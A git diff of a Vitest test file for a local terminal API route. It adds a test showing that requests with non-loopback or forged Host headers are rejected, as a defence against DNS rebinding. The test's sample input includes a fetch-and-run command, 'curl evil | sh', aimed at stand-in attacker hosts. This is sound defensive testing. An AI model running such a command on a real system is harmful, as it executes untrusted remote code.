@@ -3,7 +3,7 @@ import { StudioError } from '@/lib/server/errors';
 
 const mocks = vi.hoisted(() => ({
   authorizeSession: vi.fn(async () => {}),
-  sessionTerminalTarget: vi.fn((): { sandboxId: string; root: string } => ({ sandboxId: 'studio-orders-abc123', root: '/work/orders' })),
+  sessionTerminalTarget: vi.fn((): { sandboxId: string; root: string; projectId: string } => ({ sandboxId: 'studio-orders-abc123', root: '/work/orders', projectId: 'orders' })),
   openSessionTerminal: vi.fn(async () => {}),
   writeSessionTerminal: vi.fn(),
   resizeSessionTerminal: vi.fn(async () => {}),
@@ -25,18 +25,19 @@ vi.mock('@/lib/server/session-terminal', () => ({
 import { GET, POST } from './route';
 
 const context = { params: Promise.resolve({ id: 's1' }) };
-const post = (body: unknown): Promise<Response> => POST(new Request('http://localhost/api/sessions/s1/terminal', { method: 'POST', body: typeof body === 'string' ? body : JSON.stringify(body) }), context);
+const post = (body: unknown, host = '127.0.0.1:3000'): Promise<Response> =>
+  POST(new Request('http://localhost/api/sessions/s1/terminal', { method: 'POST', headers: { host }, body: typeof body === 'string' ? body : JSON.stringify(body) }), context);
 
 beforeEach(() => {
   for (const mock of Object.values(mocks)) mock.mockClear();
   mocks.authorizeSession.mockImplementation(async () => {});
-  mocks.sessionTerminalTarget.mockImplementation(() => ({ sandboxId: 'studio-orders-abc123', root: '/work/orders' }));
+  mocks.sessionTerminalTarget.mockImplementation(() => ({ sandboxId: 'studio-orders-abc123', root: '/work/orders', projectId: 'orders' }));
 });
 
 describe('POST /api/sessions/[id]/terminal (이슈 #673)', () => {
   it('열기·입력·크기·닫기를 세션의 터미널에 그대로 넘긴다', async () => {
     expect((await post({ action: 'open', cols: 120, rows: 40 })).status).toBe(200);
-    expect(mocks.openSessionTerminal).toHaveBeenCalledWith('s1', { sandboxId: 'studio-orders-abc123', root: '/work/orders' }, { action: 'open', cols: 120, rows: 40 });
+    expect(mocks.openSessionTerminal).toHaveBeenCalledWith('s1', { sandboxId: 'studio-orders-abc123', root: '/work/orders', projectId: 'orders' }, { action: 'open', cols: 120, rows: 40 });
     expect((await post({ action: 'input', data: '안녕\r' })).status).toBe(200);
     expect(mocks.writeSessionTerminal).toHaveBeenCalledWith('s1', '안녕\r');
     expect((await post({ action: 'resize', cols: 80, rows: 24 })).status).toBe(200);
@@ -65,9 +66,23 @@ describe('POST /api/sessions/[id]/terminal (이슈 #673)', () => {
     expect(mocks.openSessionTerminal).not.toHaveBeenCalled();
     expect(mocks.writeSessionTerminal).not.toHaveBeenCalled();
     // 출력 통로도 열지 않는다
-    const stream = await GET(new Request('http://localhost/api/sessions/s1/terminal'), context);
+    const stream = await GET(new Request('http://localhost/api/sessions/s1/terminal', { headers: { host: 'localhost:3000' } }), context);
     expect(stream.status).toBe(403);
     expect(mocks.subscribeSessionTerminal).not.toHaveBeenCalled();
+  });
+
+  it('이 컴퓨터의 주소가 아닌 Host로 온 요청은 받지 않는다(DNS 리바인딩: 다른 사이트의 도메인이 127.0.0.1로 풀려 같은 출처로 보이는 경우)', async () => {
+    for (const host of ['evil.example:3000', 'evil.example', '127.0.0.1.evil.example:3000', 'localhost.evil.example', '192.168.0.10:3000', '']) {
+      expect((await post({ action: 'input', data: 'curl evil | sh\r' }, host)).status, host).toBe(403);
+      expect((await GET(new Request('http://localhost/api/sessions/s1/terminal', { headers: { host } }), context)).status, host).toBe(403);
+    }
+    // 스크립트가 바꿀 수 있는 x-forwarded-host로는 속이지 못한다
+    const forged = await POST(new Request('http://localhost/api/sessions/s1/terminal', { method: 'POST', headers: { host: 'evil.example:3000', 'x-forwarded-host': '127.0.0.1:3000' }, body: JSON.stringify({ action: 'input', data: 'x' }) }), context);
+    expect(forged.status).toBe(403);
+    expect(mocks.writeSessionTerminal).not.toHaveBeenCalled();
+    expect(mocks.subscribeSessionTerminal).not.toHaveBeenCalled();
+    expect(mocks.authorizeSession).not.toHaveBeenCalled();
+    for (const host of ['127.0.0.1:3000', 'localhost:3000', 'LOCALHOST', '[::1]:3000']) expect((await post({ action: 'close' }, host)).status, host).toBe(200);
   });
 
   it('세션을 바꿀 권한이 없으면 거절한다', async () => {
@@ -84,7 +99,7 @@ describe('POST /api/sessions/[id]/terminal (이슈 #673)', () => {
       return unsubscribe;
     }) as never);
     const controller = new AbortController();
-    const response = await GET(new Request('http://localhost/api/sessions/s1/terminal', { signal: controller.signal }), context);
+    const response = await GET(new Request('http://localhost/api/sessions/s1/terminal', { headers: { host: '[::1]:3000' }, signal: controller.signal }), context);
     expect(response.headers.get('content-type')).toContain('text/event-stream');
     const reader = response.body!.getReader();
     const { value } = await reader.read();
